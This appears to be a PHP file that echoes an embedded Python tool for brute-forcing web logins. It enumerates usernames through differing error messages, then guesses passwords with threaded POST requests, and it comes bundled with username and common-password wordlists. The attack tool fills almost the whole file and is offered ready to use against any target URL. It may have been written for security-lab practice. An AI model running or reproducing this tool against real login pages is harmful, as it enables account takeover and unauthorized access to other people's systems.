<?php

$code = <<<'CODE'
import requests
import shutil
from concurrent.futures import ThreadPoolExecutor
import argparse
import time
import sys

parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',required=True,type=str,metavar="URL")
parse.add_argument('--username',required=True,type=str)
parse.add_argument('--password',required=True,type=str)
parse.add_argument('--threads',required=False,type=int,default=10)

arg = parse.parse_args()

urlTarget = arg.url
username = arg.username
password = arg.password 
threads = arg.threads


class C:
    RESET      = "\033[0m"
    BOLD       = "\033[1m"
    DIM        = "\033[2m"
    G_BRIGHT   = "\033[38;5;46m"   
    G_NORMAL   = "\033[38;5;40m"   
    G_DARK     = "\033[38;5;22m"   
    G_DIM      = "\033[38;5;28m" 


_FONT = {
    'T': ["#####", "..#..", "..#..", "..#..", "..#.."],
    'H': ["#...#", "#...#", "#####", "#...#", "#...#"],
    'E': ["#####", "#....", "####.", "#....", "#####"],
    '0': [".###.", "#...#", "#...#", "#...#", ".###."],
    'X': ["#...#", ".#.#.", "..#..", ".#.#.", "#...#"],
}


def _build_logo(word: str = "THE0X", spacing: int = 2) -> list:
    rows = []
    for r in range(5):
        line = (" " * spacing).join(_FONT[ch][r] for ch in word)
        rows.append(line.replace("#", "█").replace(".", " "))
    return rows


def print_banner(animate: bool = False):
    fields = [
        ("Author ",  "the0x"),
        ("GitHub ",  "github.com/the0x-pwn"),
        ("Created",  "26/7/2026"),
        ("Country",  "Iraq"),
    ]
    prompt = ("root@the0x:~# ./tool.py --u http://target.com "
              "--username /usr/username.txt --password /usr/password --threads 60")

    logo_width = max(len(l) for l in _build_logo())
    fields_width = max(len(f"[+] {label} : {value}") for label, value in fields)
    content_width = max(logo_width, fields_width, len(prompt), len("[ Python Security Tool ]"))

    min_width = content_width + 6 
    term_width = shutil.get_terminal_size((min_width, 20)).columns
    width = max(min_width, min(term_width, 200))

    inner = width - 2
    top    = f"{C.G_DARK}┌{'─' * inner}┐{C.RESET}"
    bottom = f"{C.G_DARK}└{'─' * inner}┘{C.RESET}"
    empty  = f"{C.G_DARK}│{C.RESET}{' ' * inner}{C.G_DARK}│{C.RESET}"

    def row(colored_text: str, raw_len: int, align: str = "center"):
        space = inner - raw_len
        if align == "center":
            left = space // 2
            right = space - left
        else:
            left, right = 2, space - 2
        return f"{C.G_DARK}│{C.RESET}{' ' * left}{colored_text}{' ' * right}{C.G_DARK}│{C.RESET}"

    lines = [top, empty]

    for l in _build_logo():
        lines.append(row(f"{C.BOLD}{C.G_BRIGHT}{l}{C.RESET}", len(l)))

    lines.append(empty)
    tagline = "[ Python Security Tool ]"
    lines.append(row(f"{C.DIM}{C.G_NORMAL}{tagline}{C.RESET}", len(tagline)))
    lines.append(empty)
    lines.append(row(f"{C.G_DIM}{'─' * (inner - 8)}{C.RESET}", inner - 8))
    lines.append(empty)

    for label, value in fields:
        raw = f"[+] {label} : {value}"
        colored = (f"{C.G_DIM}[{C.RESET}{C.G_BRIGHT}+{C.RESET}{C.G_DIM}]{C.RESET} "
                   f"{C.G_NORMAL}{label}{C.RESET} {C.G_DIM}:{C.RESET} "
                   f"{C.BOLD}{C.G_BRIGHT}{value}{C.RESET}")
        lines.append(row(colored, len(raw), align="left"))

    lines.append(empty)
    lines.append(row(f"{C.G_DIM}{'─' * (inner - 8)}{C.RESET}", inner - 8))
    lines.append(empty)

    cmd_part = prompt.split("# ", 1)[1]
    lines.append(row(f"{C.G_NORMAL}root{C.RESET}{C.G_DIM}@{C.RESET}{C.G_NORMAL}the0x{C.RESET}"
                      f"{C.G_DIM}:~#{C.RESET} {C.BOLD}{C.G_BRIGHT}{cmd_part}{C.RESET}",
                      len(prompt), align="left"))

    lines.append(empty)
    lines.append(bottom)

    print()
    if animate:
        for l in lines:
            print(l)
            time.sleep(0.02)
    else:
        print("\n".join(lines))
    print()


if __name__ == "__main__":
    print_banner(animate=("--animate" in sys.argv))




# username and password
success_username = ''
success_password = ''

start = time.time()
def check_username(username):
    global success_username
    data = {
        "username" : username,
        "password" : "test"
    }

    with requests.Session() as s:
        response = s.post(url=urlTarget, data=data, allow_redirects=True, timeout=4)

    if 'Invalid username' not in response.text:
        print(f'[+] Found username')
        success_username = username

with ThreadPoolExecutor(max_workers=threads) as executor_username:
    print(f"[+] Start get username")
    with open(username, 'r', encoding='latin-1') as user_name:
        bfUsername = [line.strip() for line in user_name if line.strip()]
    for user in bfUsername:
        if success_username:
            break
        executor_username.submit(check_username, user)


def check_password(password):
    global success_username
    global success_password
    data = {
        "username" : success_username,
        "password" : password
    }

    with requests.Session() as s:
        response = s.post(url=urlTarget, data=data, allow_redirects=True, timeout=4)

    if 'Incorrect password' not in response.text:
        print(f'[+] Found password')
        success_password = password



with ThreadPoolExecutor(max_workers=threads) as executor_password:
    print(f"[+] Start get password")
    with open(password, 'r', encoding='latin-1') as passwd:
        bfPassword = [line.strip() for line in passwd if line.strip()]
    for pass_wd in bfPassword:
        if success_password:
            break
        executor_password.submit(check_password, pass_wd)


end = time.time()

if success_username and success_password:
    print(f'[*] Found credentials:')
    print(f'    username:{success_username}')
    print(f'    password:{success_password}')
    print(f'[*] Execution time: {end - start:.2f} seconds')
else:
    print('[-] Not Found username or password')
===================================================================================================
// wordlist username
carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
admin
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
batman
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover

===================================================================================================
// wordlist password
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
secret
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
scooby
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
CODE;

echo $code;




